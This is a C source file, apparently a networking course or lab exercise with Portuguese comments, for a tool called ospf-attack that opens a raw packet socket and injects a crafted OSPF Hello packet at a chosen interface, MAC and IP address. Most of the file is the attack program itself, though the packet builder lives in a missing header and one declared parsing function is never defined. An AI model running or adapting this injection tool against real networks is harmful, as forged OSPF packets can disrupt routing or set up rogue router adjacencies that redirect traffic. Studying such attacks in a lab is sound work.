/*-------------------------------------------------------------*/
/* Exemplo Socket Raw - envio de mensagens                     */
/*-------------------------------------------------------------*/

#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <linux/if_ether.h>
#include <netpacket/packet.h>
#include <net/ethernet.h>
#include <netinet/ether.h>
#include <arpa/inet.h>
#include "ospf_attack.h"

unsigned char *parse_mac_addr(char *mac_str);
unsigned char *parse_ip_addr(char *ip_str);

extern int errno;

int main(int argc, char *argv[]) {
  if (argc != 7) {
    printf("Usage: ospf-attack INTERFACE INTERFACE_NUMBER LOCAL_MAC_ADDR LOCAL_IP_ADDR DESTINATION_MAC_ADDR DESTINATION_IP_ADDR\n\n");
    exit(1);
  }

  int sock_fd = 0, ret_value = 0;
  unsigned char buffer[BUFFER_LEN], dummy_buffer[50];
  struct sockaddr_ll destAddr;

  // Set up mac / IPv4 addresses for the machines that will receive the packets
  char *iface_name      = argv[1];
  char *iface_index_str = argv[2]; // TODO: Usar para ler pacotes
  char *local_mac_str   = argv[3];
  char *local_ip        = argv[4];
  char *dest_mac_str    = argv[5];
  char *dest_ip         = argv[6];

  // Convert input to bytes
  unsigned char *local_mac = parse_mac_addr(local_mac_str);
  unsigned char *dest_mac  = parse_mac_addr(dest_mac_str);
  int iface_index = atoi(iface_index_str);

  // This helps us identify our requests
  // unsigned short identifier = getpid();
  // printf("PID: %d\n", identifier);

  if((sock_fd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0) {
    printf("Erro na criacao do socket.\n");
    exit(1);
  }

  destAddr.sll_family = htons(PF_PACKET);
  destAddr.sll_protocol = htons(ETH_P_ALL);
  destAddr.sll_halen = 6;
  destAddr.sll_ifindex = iface_index;
  memcpy(&(destAddr.sll_addr), dest_mac, MAC_ADDR_LEN);

  int packet_len = build_hello(buffer, local_mac, local_ip, dest_mac, dest_ip);

  memcpy((buffer+packet_len), dummy_buffer, 50);

  if((ret_value = sendto(sock_fd, buffer, 64, 0, (struct sockaddr *)&(destAddr), sizeof(struct sockaddr_ll))) < 0) {
    printf("ERROR! sendto() \n");
    exit(1);
  }
  printf("Send success (%d).\n", ret_value);

  return 0;
}

// Based on http://stackoverflow.com/a/3409211
unsigned char *parse_mac_addr(char *mac_str) {
  unsigned char *result = calloc(MAC_ADDR_LEN, sizeof(unsigned char));
  sscanf(mac_str, "%2hhx:%2hhx:%2hhx:%2hhx:%2hhx:%2hhx", result, result + 1, result + 2, result + 3, result + 4, result + 5);
  return result;
}
